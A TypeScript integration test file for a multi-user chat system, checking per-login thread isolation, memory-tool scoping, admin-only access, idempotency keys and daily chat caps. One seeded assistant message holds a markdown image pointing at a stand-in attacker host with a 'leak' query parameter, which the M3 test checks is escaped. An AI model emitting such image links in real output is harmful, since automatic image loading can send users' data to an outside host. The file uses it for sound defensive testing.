/**
 * W7c (fix round 1): each user reads only their own chat threads, the owner
 * included, and the chat routes hold that per role. On a migrated scratch
 * database switched onto workspaces, with the chat gate stood in (a login
 * object per role, never a minted session) and the durable queue faked:
 *
 *  - H1: a second Admin user talking to a helper with no workspace (the
 *    replay agent) replays and finds only its own turns and digests, never
 *    the owner's; with no login it is refused; over MCP the same.
 *  - M1: responder_turn_record over a second Admin user's MCP lands in that
 *    user's thread.
 *  - M3: a member's thread comes back with a picture it may not see escaped.
 *  - M4 (a client had no chat) went with the client login in W8a: the
 *    role check admits admin and member only, so no such row is made.
 *  - A member asking for the Admin assistant by slug gets 404.
 *  - L1: a second login reusing an Idempotency-Key gets its own turn.
 *  - L2: a member's New chat counts against its daily cap.
 *  - Fix round 2, H1: a second Admin user chatting with the replay agent
 *    (no workspace) runs in its own turn scope of Admin: search_nodes,
 *    search_chunks, node_read and entity_facts never reach the owner's
 *    digest or archived chat summary, and the owner never reaches its; a
 *    login that is not an Admin user is refused; a chat turn with no login
 *    is refused.
 *  - Fix round 2, M-a: persona notes ride the owner's thread only.
 *  - Fix round 2, Low: each chat writer stores the login it names, a
 *    writer naming none stores the anchor's (the resumed run with no login).
 *
 *   MANTLE_TEST_DATABASE_URL=postgres://… pnpm vitest run server/web/server/w7c-chat.db.test.ts
 */
import { randomUUID } from 'node:crypto';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { sql } from 'drizzle-orm';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

const URL = process.env.MANTLE_TEST_DATABASE_URL;
const VEC = Array.from({ length: 768 }, (_, i) => (i === 0 ? 1 : 0));

const h = vi.hoisted(() => ({
  login: null as unknown,
  enqueued: [] as { id: string; input: unknown }[],
}));

/** The chat caller of a stand-in chat answer (chatCaller, plan v3.2
 *  section 2.2): the answer without its kind, with its Login; adminFacts
 *  (mocked below) answers the kind. */
function standInChatCaller(chat: unknown) {
  const c = chat as {
    kind: string;
    ownerId: string;
    loginId: string;
    source: string;
    user: { id: string; email: string; actor: Record<string, unknown> };
    displayName: string | null;
    email: string;
  } | null;
  if (!c) throw new Error('chatCaller(): the pipeline answered no chat login');
  const { kind, ...rest } = c;
  return {
    ...rest,
    asLogin: {
      loginId: c.loginId,
      brainId: c.ownerId,
      email: c.email,
      displayName: c.displayName,
      contactId: null,
      source: c.source,
      sessionEpoch: 0,
      actor: c.user.actor,
      standInAdmin: kind === 'admin',
    },
  };
}
vi.mock('@/lib/auth/login', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  adminFacts: vi.fn(async (l: { standInAdmin?: boolean }) => ({
    admin: l.standInAdmin === true,
    areas: new Set(),
  })),
}));
vi.mock('@/lib/auth', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  getChatLoginOr401: vi.fn(async () => h.login),
  // The reader a converted chat handler calls (A4 step 3b part 5): the
  // same stand-in.
  chatLoginCaller: vi.fn(() => h.login),
  // The reader the chat handlers call now (chatCaller): the same stand-in.
  chatCaller: vi.fn(() => standInChatCaller(h.login)),
}));
vi.mock('@/lib/dbos-client', () => ({
  getDbosClient: async () => ({
    enqueue: async (o: { workflowID?: string }, input: unknown) => {
      h.enqueued.push({ id: o.workflowID ?? '', input });
      return { getResult: async () => null };
    },
    getWorkflow: async (id: string) => ({
      input: [h.enqueued.find((e) => e.id === id)?.input],
    }),
  }),
}));
// The replay agent's key: a stand-in secret (the scratch database has no
// sealed key to open).
vi.mock('@mantle/api-keys', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  getApiKeyById: vi.fn(async () => 'sk-test'),
}));
vi.mock('@mantle/embeddings', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  embed: vi.fn(async () => VEC),
}));

describe.skipIf(!URL)('W7c: own threads only, per role', () => {
  type Ts = typeof import('@mantle/db/test-support');
  let scratch: Awaited<ReturnType<Ts['createMigratedScratchDatabase']>> | undefined;
  let m: typeof import('@mantle/db');
  let t: typeof import('@mantle/tools');
  let rt: typeof import('@mantle/runtime/agent');
  let threadRoute: typeof import('../app/api/assistant/thread/route');
  let threadsRoute: typeof import('../app/api/assistant/threads/route');
  let turnRoute: typeof import('../app/api/assistant/turn/route');
  let dir = '';
  const tag = `w7cc${randomUUID().slice(0, 6)}`;
  const owner = randomUUID();
  const adminB = randomUUID();
  const member = randomUUID();
  const member2 = randomUUID();
  const member3 = randomUUID();
  const adminSlug = `${tag}-admin`;
  const teamSlug = `${tag}-team`;
  let adminWs = '';
  let teamWs = '';
  let adminAgent = '';
  let teamAgent = '';
  let remy = '';
  const ownerDigest = randomUUID();
  const bDigest = randomUUID();
  const ownerArchive = randomUUID();
  const bArchive = randomUUID();
  let entityId = '';

  const x = async <T>(q: ReturnType<typeof sql>): Promise<T[]> =>
    (await m.systemDb.execute(q)) as unknown as T[];
  /** A fixture write to the four workspace tables, as the superuser: the
   *  system pool only reads them under test:runtime-role. */
  const su = async <T>(q: ReturnType<typeof sql>): Promise<T[]> =>
    (await import('@mantle/db/test-support')).superuserExec<T>(scratch!.url, q);
  const req = (p: string, init?: RequestInit) => new Request(`http://brain.test${p}`, init);
  const chatLogin = (kind: 'admin' | 'member', loginId: string) => ({
    kind,
    ownerId: owner,
    loginId,
    source: 'web',
    user: {
      id: owner,
      email: `${loginId}@example.invalid`,
      actor: {
        id: loginId,
        email: `${loginId}@example.invalid`,
        displayName: null,
        isOwner: loginId === owner,
      },
    },
    displayName: null,
    email: `${loginId}@example.invalid`,
  });
  const window = {
    from: new Date(Date.now() - 86_400_000).toISOString(),
    to: new Date(Date.now() + 86_400_000).toISOString(),
  };
  const replay = (surface: unknown) =>
    t.getBuiltin('replay_window')!.handler(
      { ...window, surface: 'all' },
      {
        ownerId: owner,
        surface: surface as never,
      },
    );
  const find = (surface: unknown) =>
    t
      .getBuiltin('find_window')!
      .handler({ topic: 'kettle' }, { ownerId: owner, surface: surface as never });
  const texts = (r: { ok: boolean; output?: unknown }) =>
    ((r.output as { turns?: { text: string }[] })?.turns ?? []).map((x) => x.text);
  const windowIds = (r: { ok: boolean; output?: unknown }) =>
    ((r.output as { windows?: { node_id: string }[] })?.windows ?? []).map((w) => w.node_id);
  const asRemy = <T>(fn: () => Promise<T>, loginId?: string) =>
    rt.withAgentScope({ id: remy, workspaceId: null }, fn, {
      ownerLoginId: loginId ?? null,
    });
  const mcpCall = async (loginId: string, name: string, args: Record<string, unknown>) => {
    const ls = await import('@mantle/mcp-core');
    const { McpServer, InMemoryTransport } = await import('@modelcontextprotocol/server');
    const { Client } = await import('@modelcontextprotocol/client');
    const server = new McpServer({ name: 'test', version: '0' });
    ls.registerPreparedTools(
      server,
      await ls.prepareCallerTools({
        role: 'admin',
        anchorId: owner,
        loginId,
        via: 'oauth',
        write: true,
      }),
    );
    const [a, b] = InMemoryTransport.createLinkedPair();
    const c = new Client({ name: 'test-client', version: '0' });
    await Promise.all([server.connect(a), c.connect(b)]);
    const res = (await c.callTool({ name, arguments: args })) as {
      isError?: boolean;
      content?: { text?: string }[];
    };
    await c.close();
    return { isError: res.isError === true, text: res.content?.map((p) => p.text).join('') ?? '' };
  };

  beforeAll(async () => {
    const ts: Ts = await import('@mantle/db/test-support');
    scratch = await ts.createMigratedScratchDatabase(URL!);
    dir = await mkdtemp(path.join(tmpdir(), 'w7c-chat-'));
    process.env.DATABASE_URL = scratch.url;
    process.env.TABLE_DB_DIR = path.join(dir, 'tables');
    process.env.APP_DB_DIR = path.join(dir, 'apps');
    process.env.FILES_DIR = path.join(dir, 'files');
    process.env.MANTLE_FILES_ROOT = path.join(dir, 'files');
    process.env.MANTLE_SPACES_ROOT = path.join(dir, 'spaces');
    process.env.MANTLE_MASTER_KEY ??= 'mantle-viewer-test-key';
    process.env.TEAM_CHAT_DAILY_TURNS = '3';
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response('offline in the W7c test', { status: 503 })),
    );
    m = await import('@mantle/db');
    t = await import('@mantle/tools');
    rt = await import('@mantle/runtime/agent');
    threadRoute = await import('../app/api/assistant/thread/route');
    threadsRoute = await import('../app/api/assistant/threads/route');
    turnRoute = await import('../app/api/assistant/turn/route');

    await x(sql`insert into auth.users (id, email, password_hash, is_owner, role, display_name) values
      (${owner}, ${`${tag}-o@example.invalid`}, 'x', true, 'admin', 'Owner'),
      (${adminB}, ${`${tag}-b@example.invalid`}, 'x', false, 'admin', 'Second admin'),
      (${member}, ${`${tag}-m@example.invalid`}, 'x', false, 'member', 'Member'),
      (${member2}, ${`${tag}-n@example.invalid`}, 'x', false, 'member', 'Member two'),
      (${member3}, ${`${tag}-p@example.invalid`}, 'x', false, 'member', 'Member three')`);
    await x(sql`insert into spaces (id, kind, login_id) values (${owner}, 'brain', ${owner})
      on conflict (id) do nothing`);
    const migrated = await (
      await import('@mantle/db/test-support')
    ).runWorkspacesSwitch<{ section: string }>();
    expect(migrated.filter((r) => r.section === 'reach-fail')).toEqual([]);
    const wsRows = await x<{ id: string; is_admin: boolean; bridge_key: string | null }>(
      sql`select id::text, is_admin, bridge_key from workspaces where owner_id = ${owner}`,
    );
    expect(wsRows.length, JSON.stringify({ migrated, wsRows })).toBeGreaterThan(0);
    adminWs = (
      await x<{ id: string }>(sql`select id::text from workspaces
        where owner_id = ${owner} and is_admin and archived_at is null`)
    )[0]!.id;
    teamWs = (
      await x<{ id: string }>(sql`select id::text from workspaces
        where owner_id = ${owner} and name = 'Team' and not is_admin and archived_at is null`)
    )[0]!.id;
    for (const [ws, login] of [
      [adminWs, adminB],
      [teamWs, member],
      [teamWs, member2],
      [teamWs, member3],
    ] as const) {
      await su(sql`insert into workspace_users (workspace_id, login_id, moderator)
        values (${ws}, ${login}, false) on conflict do nothing`);
    }
    const agent = async (slug: string, role: string, ws: string | null) => {
      const [row] = await m.systemDb
        .insert(m.agents)
        .values({
          ownerId: owner,
          slug,
          name: slug,
          model: 'test/model',
          systemPrompt: 'p',
          role: role as never,
          workspaceId: ws,
          memoryConfig: { chunk_limit: 0, content_hit_limit: 0, corpus_map_limit: 0 },
        })
        .returning();
      if (ws) {
        await su(sql`insert into workspace_resources (workspace_id, type, ref_id, write)
          values (${ws}, 'assistant', ${row!.id}, true) on conflict do nothing`);
      }
      return row!.id;
    };
    adminAgent = await agent(adminSlug, 'assistant', adminWs);
    teamAgent = await agent(teamSlug, 'responder', teamWs);
    remy = await agent(`${tag}-remy`, 'custom', null);
    // A key row for the replay agent (its secret is stood in, see the mock
    // above): a chat turn reaches recordTurn, then the model call fails
    // (fetch is offline).
    const [key] = await x<{ id: string }>(sql`insert into api_keys
      (user_id, service, label, key_enc) values (${owner}, 'openrouter', ${`${tag}-key`},
      decode('00', 'hex')) returning id::text`);
    await x(sql`update agents set api_key_id = ${key!.id} where id = ${remy}`);

    // The owner's and the second Admin user's own turns with the Admin
    // assistant, and a digest of each.
    for (const [login, text] of [
      [owner, `${tag} owner secret kettle`],
      [adminB, `${tag} second admin question`],
    ] as const) {
      await m.asSystem(
        () =>
          rt.recordTurn({
            ownerId: owner,
            agentId: adminAgent,
            loginId: login,
            direction: 'inbound',
            text,
            channel: 'web',
          }),
        'test',
      );
    }
    const vec = JSON.stringify(VEC);
    for (const [id, login] of [
      [ownerDigest, owner],
      [bDigest, adminB],
    ] as const) {
      const data = {
        kind: 'conversation_digest',
        agent_id: adminAgent,
        login_id: login,
        topic: 'kettle',
        summary: `${login} kettle`,
        period_start: window.from,
        period_end: window.to,
      };
      await x(sql`insert into nodes (id, owner_id, type, title, path, tags, data, embedding, login_id)
        values (${id}, ${owner}, 'note', 'Digest', 'notes',
                ARRAY['conversation-digest']::text[], ${JSON.stringify(data)}::jsonb,
                ${vec}::vector, ${login})`);
      await x(sql`insert into item_grants (node_id, workspace_id, write, is_home)
        values (${id}, ${adminWs}, false, true) on conflict do nothing`);
    }

    // Archived chat summaries (0269: the login's own note), one per login,
    // and a passage and a fact on each digest and summary.
    for (const [id, login] of [
      [ownerArchive, owner],
      [bArchive, adminB],
    ] as const) {
      const data = {
        kind: 'chat_archive',
        agent_id: remy,
        login_id: login,
        topic: 'kettle',
        summary: `${login} kettle archive`,
        content: `${login} kettle archive`,
      };
      await x(sql`insert into nodes (id, owner_id, type, title, path, tags, data, embedding, login_id)
        values (${id}, ${owner}, 'note', ${`${tag} kettle archive`}, 'notes',
                ARRAY['chat-archive']::text[], ${JSON.stringify(data)}::jsonb,
                ${vec}::vector, ${login})`);
      await x(sql`insert into item_grants (node_id, workspace_id, write, is_home)
        values (${id}, ${adminWs}, false, true) on conflict do nothing`);
    }
    entityId = (
      await x<{ id: string }>(sql`insert into entities (owner_id, kind, name)
        values (${owner}, 'thing', ${`${tag} kettle`}) returning id::text`)
    )[0]!.id;
    for (const id of [ownerDigest, bDigest, ownerArchive, bArchive]) {
      await x(sql`insert into content_chunks (owner_id, node_id, ordinal, text, embedding)
        values (${owner}, ${id}, 0, ${`${tag} kettle passage ${id}`}, ${vec}::vector)`);
      await x(sql`insert into facts (owner_id, kind, content, source_node_id, entity_id, embedding)
        values (${owner}, 'factual', ${`${tag} kettle fact ${id}`}, ${id}, ${entityId},
                ${vec}::vector)`);
    }

    // A member's thread with the Team assistant, one reply carrying a
    // picture from outside.
    await x(sql`insert into chat_threads (owner_id, agent_id, status, login_id, started_at)
      values (${owner}, ${teamAgent}, 'open', ${member}, now() - interval '1 hour')`);
    await x(sql`insert into assistant_messages (owner_id, agent_id, direction, text, channel, login_id,
                                               workspace_id, created_at)
      values (${owner}, ${teamAgent}, 'outbound', 'look ![x](https://evil.example/?q=leak) here',
              'web', ${member}, ${teamWs}, now() - interval '30 minutes')`);
  }, 240_000);

  afterAll(async () => {
    vi.unstubAllGlobals();
    delete process.env.TEAM_CHAT_DAILY_TURNS;
    await m?.closeDb();
    await scratch?.drop();
    if (dir) await rm(dir, { recursive: true, force: true });
  }, 60_000);

  // ── H1 ────────────────────────────────────────────────────────────────

  it('H1: a second Admin user with the replay agent reads its own turns and digests only', async () => {
    const seen = await asRemy(
      async () => ({
        replay: await replay({ kind: 'owner', via: 'run' }),
        find: await find({ kind: 'owner', via: 'run' }),
        stamp: m.currentTurnStamp(),
      }),
      adminB,
    );
    // Fix round 2: the helper answers adminB in its turn scope of Admin.
    expect(seen.stamp).toEqual({ workspaceId: adminWs, loginId: adminB });
    expect(seen.replay.ok).toBe(true);
    expect(texts(seen.replay)).toContain(`${tag} second admin question`);
    expect(texts(seen.replay)).not.toContain(`${tag} owner secret kettle`);
    expect(windowIds(seen.find)).toContain(bDigest);
    expect(windowIds(seen.find)).not.toContain(ownerDigest);
    // The owner, asking for itself, reads its own.
    const own = await asRemy(() => replay({ kind: 'owner', via: 'run' }), owner);
    expect(texts(own)).toContain(`${tag} owner secret kettle`);
    expect(texts(own)).not.toContain(`${tag} second admin question`);
  });

  it('H1: with no login asked, replay and find refuse (never the anchor)', async () => {
    const seen = await asRemy(async () => ({
      replay: await replay({ kind: 'owner', via: 'run' }),
      find: await find({ kind: 'owner', via: 'run' }),
    }));
    expect(seen.replay.ok).toBe(false);
    expect(seen.find.ok).toBe(false);
  });

  it('H1: over MCP a second Admin user never reads the owner’s', async () => {
    const r = await mcpCall(adminB, 'replay_window', { ...window });
    expect(r.isError, r.text.slice(0, 200)).toBe(false);
    expect(r.text).toContain('second admin question');
    expect(r.text).not.toContain('owner secret kettle');
    const f = await mcpCall(adminB, 'find_window', { topic: 'kettle' });
    expect(f.isError, f.text.slice(0, 200)).toBe(false);
    expect(f.text).toContain(bDigest);
    expect(f.text).not.toContain(ownerDigest);
  });

  // ── Fix round 2, H1: the memory tools ──────────────────────────────────

  /** What the four memory tools return for `login` talking to the replay
   *  agent: every id of the four derived nodes they name. */
  const memoryReads = (login: string) =>
    asRemy(async () => {
      const ctx = { ownerId: owner, surface: { kind: 'web', loginId: login } as never };
      const tool = (slug: string, input: Record<string, unknown>) =>
        t.getBuiltin(slug)!.handler(input, ctx);
      const scope = m.currentWorkspaceScope();
      const nodesHit = await tool('search_nodes', { q: `${tag} kettle`, limit: 50 });
      const chunksHit = await tool('search_chunks', { q: `${tag} kettle`, limit: 50 });
      const read: Record<string, boolean> = {};
      for (const id of [ownerDigest, bDigest, ownerArchive, bArchive]) {
        read[id] = (await tool('node_read', { node_id: id })).ok;
      }
      const factsHit = await tool('entity_facts', { entity_id: entityId, limit: 100 });
      const all = JSON.stringify([nodesHit, chunksHit, factsHit]);
      const named = (id: string) => all.includes(id) || read[id] === true;
      return {
        scope: scope ? { kind: scope.kind, loginId: scope.loginId, ws: [...scope.ws] } : null,
        ok: [nodesHit.ok, chunksHit.ok, factsHit.ok],
        owner: [ownerDigest, ownerArchive].filter(named),
        b: [bDigest, bArchive].filter(named),
        facts: (factsHit.ok ? (factsHit.output as { content: string }[]) : []).map(
          (f) => f.content,
        ),
      };
    }, login);

  it('H1 (fix round 2): the second Admin user’s memory tools never reach the owner’s digest or summary', async () => {
    const seen = await memoryReads(adminB);
    expect(seen.scope).toEqual({ kind: 'assistant', loginId: adminB, ws: [adminWs] });
    expect(seen.ok).toEqual([true, true, true]);
    expect(seen.owner).toEqual([]);
    // Its own are there: the rule is per login, not "no digests".
    expect(seen.b).toEqual([bDigest, bArchive]);
    expect(seen.facts.some((f) => f.includes(ownerDigest) || f.includes(ownerArchive))).toBe(false);
  });

  it('H1 (fix round 2): the owner’s memory tools never reach the second Admin user’s', async () => {
    const seen = await memoryReads(owner);
    expect(seen.scope).toEqual({ kind: 'assistant', loginId: owner, ws: [adminWs] });
    expect(seen.b).toEqual([]);
    expect(seen.owner).toEqual([ownerDigest, ownerArchive]);
  });

  it('H1 (fix round 2): a login that is not an Admin user is refused; no login is system work', async () => {
    await expect(asRemy(async () => 'ran', member)).rejects.toThrow(
      /not a user of the Admin workspace/,
    );
    // No login asked: system work (W8c: no level decides it).
    expect(await asRemy(async () => m.currentWorkspaceScope())).toBeNull();
  });

  it('H1 (fix round 2): a chat turn with the replay agent and no login is refused before writing', async () => {
    const ra = await import('@mantle/runtime/assistant');
    const text = `${tag} chat with no login`;
    await expect(ra.runAssistantTurn(owner, text, { agentSlug: `${tag}-remy` })).rejects.toThrow(
      /signed-in login/,
    );
    expect(await x(sql`select 1 from assistant_messages where text = ${text}`)).toHaveLength(0);
  });

  // ── Fix round 2, M-a ──────────────────────────────────────────────────

  it('M-a: persona notes ride the owner’s thread only', async () => {
    const note = { kind: 'style', content: `${tag} owner likes short answers`, at: window.from };
    // Notes kept on the agent (memory_config.notes_target = persona; the
    // default sends them to the Journal instead).
    await x(sql`update agents set persona_notes = ${JSON.stringify([note])}::jsonb,
      memory_config = memory_config || '{"notes_target":"persona"}'::jsonb
      where id = ${adminAgent}`);
    const [row] = await m.systemDb
      .select()
      .from(m.agents)
      .where(sql`${m.agents.id} = ${adminAgent}`);
    const notesFor = async (ownerLoginId: string | null) =>
      (
        await rt.loadConversationContext({
          ownerId: owner,
          agent: row!,
          inboundText: 'hello there, how are you',
          ownerLoginId,
        })
      ).personaNotes.map((n) => n.content);
    expect(await notesFor(owner)).toEqual([note.content]);
    expect(await notesFor(adminB)).toEqual([]);
    // A turn that answers no login acts for the owner: its thread, its notes.
    expect(await notesFor(null)).toEqual([note.content]);
    // The stored notes are kept as they are.
    const [after] = await x<{ n: number }>(sql`select jsonb_array_length(persona_notes) as n
      from agents where id = ${adminAgent}`);
    expect(Number(after!.n)).toBe(1);
  });

  // ── Fix round 2, Low: the writers store the login they name ──────────

  it('Low: each chat writer stores the expected login', async () => {
    const loginOf = async (text: string) =>
      (
        await x<{ login: string; direction: string }>(sql`select login_id::text as login, direction
          from assistant_messages where owner_id = ${owner} and text = ${text}
          order by created_at`)
      ).map((r) => r.login);

    // run-turn (the web chat): the signed-in login, here the second Admin
    // user with the replay agent. The model call fails (fetch is offline),
    // after the inbound row is written.
    // The model answers 400 at once (no retry); the inbound row is written.
    const ra = await import('@mantle/runtime/assistant');
    const webText = `${tag} writer web`;
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response('{"error":"refused in the W7c test"}', { status: 400 })),
    );
    try {
      await ra
        .runAssistantTurn(owner, webText, { agentSlug: `${tag}-remy`, loginId: adminB })
        .catch(() => undefined);
    } finally {
      vi.stubGlobal(
        'fetch',
        vi.fn(async () => new Response('offline in the W7c test', { status: 503 })),
      );
    }
    expect(await loginOf(webText)).toEqual([adminB]);

    // run-team-turn: the member's own login (an early failure: the Team
    // assistant has no key, and the message is still recorded).
    const teamText = `${tag} writer team`;
    await ra
      .runTeamTurn(owner, teamText, { loginId: member2, channel: 'web' })
      .catch(() => undefined);
    expect(await loginOf(teamText)).toEqual([member2]);

    // The access-key notice (appendThreadMessage): the member's own thread.
    const notify = await import('../lib/access-keys-notify');
    await notify.notifyKeyMade({
      ownerId: owner,
      loginId: member3,
      role: 'member',
      name: `${tag} key`,
      access: 'read',
      expiresAt: null,
    });
    const [keyRow] = await x<{ login: string }>(sql`select login_id::text as login
      from assistant_messages where owner_id = ${owner} and agent_id = ${teamAgent}
       and text like 'A new API key was made on your login%' order by created_at desc limit 1`);
    expect(keyRow?.login).toBe(member3);

    // The reminder (events-reminders: loginId ownerId) and the resumed run
    // (runs-resume-turn: the run's login, NULL when it has none) through
    // recordTurn, the call both make: a named login is kept, and NULL is
    // the anchor's thread (0269), the intended case for a run that answered
    // no login.
    for (const [text, loginId, expected] of [
      [`${tag} writer reminder`, owner, owner],
      [`${tag} writer resume named`, adminB, adminB],
      [`${tag} writer resume none`, null, owner],
    ] as const) {
      await m.asSystem(
        () =>
          rt.recordTurn({
            ownerId: owner,
            agentId: adminAgent,
            loginId,
            direction: 'outbound',
            text,
            channel: 'web',
            data: { run_resume: true },
          }),
        'test',
      );
      expect(await loginOf(text)).toEqual([expected]);
    }
  }, 120_000);

  // ── M1 ────────────────────────────────────────────────────────────────

  it('M1: responder_turn_record over a second Admin user’s MCP lands in its own thread', async () => {
    const message = `${tag} recorded by B`;
    const r = await mcpCall(adminB, 'responder_turn_record', {
      message,
      reply: 'answered over MCP',
      model: 'test-model',
      agent_slug: adminSlug,
    });
    expect(r.isError, r.text.slice(0, 300)).toBe(false);
    const rows = await x<{ login: string }>(sql`select login_id::text as login
      from assistant_messages where owner_id = ${owner} and channel = 'mcp'
       and (text = ${message} or text = 'answered over MCP')`);
    expect(rows.map((row) => row.login)).toEqual([adminB, adminB]);
  });

  // ── Routes ────────────────────────────────────────────────────────────

  it('M3: a member’s thread comes back with the outside picture escaped', async () => {
    h.login = chatLogin('member', member);
    const res = await threadRoute.GET(req(`/api/assistant/thread?agent=${teamSlug}`));
    expect(res.status).toBe(200);
    const body = (await res.json()) as { messages: { text: string }[] };
    expect(body.messages.length).toBeGreaterThan(0);
    for (const msg of body.messages) {
      expect(msg.text).not.toMatch(/(^|[^\\])!\[[^\]]*\]\(https:\/\/evil/);
    }
  });

  it('a member asking for the Admin assistant by slug gets 404', async () => {
    h.login = chatLogin('member', member);
    const res = await turnRoute.POST(
      req('/api/assistant/turn', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ text: 'hello', agentSlug: adminSlug }),
      }),
    );
    expect(res.status).toBe(404);
    expect(await res.json()).toMatchObject({ reason: 'no-chat-agent' });
  });

  it('L1: a second login reusing an Idempotency-Key gets its own turn', async () => {
    const key = randomUUID();
    const post = async (loginId: string) => {
      h.login = chatLogin('member', loginId);
      const res = await turnRoute.POST(
        req('/api/assistant/turn', {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'idempotency-key': key },
          body: JSON.stringify({ text: 'same words', agentSlug: teamSlug }),
        }),
      );
      return { status: res.status, body: (await res.json()) as { turnId?: string } };
    };
    const a = await post(member);
    expect(a).toEqual({ status: 202, body: { turnId: `ws-${member}.${key}` } });
    const b = await post(member2);
    expect(b).toEqual({ status: 202, body: { turnId: `ws-${member2}.${key}` } });
    expect(h.enqueued.map((e) => e.id)).toEqual(
      expect.arrayContaining([`ws-${member}.${key}`, `ws-${member2}.${key}`]),
    );
  });

  it('L2: a member’s New chat counts against its daily cap', async () => {
    h.login = chatLogin('member', member3);
    const statuses: number[] = [];
    for (let i = 0; i < 4; i += 1) {
      const res = await threadsRoute.POST(
        req('/api/assistant/threads', {
          method: 'POST',
          body: JSON.stringify({ agent: teamSlug }),
        }),
      );
      statuses.push(res.status);
    }
    expect(statuses).toEqual([200, 200, 200, 429]);
  });
});
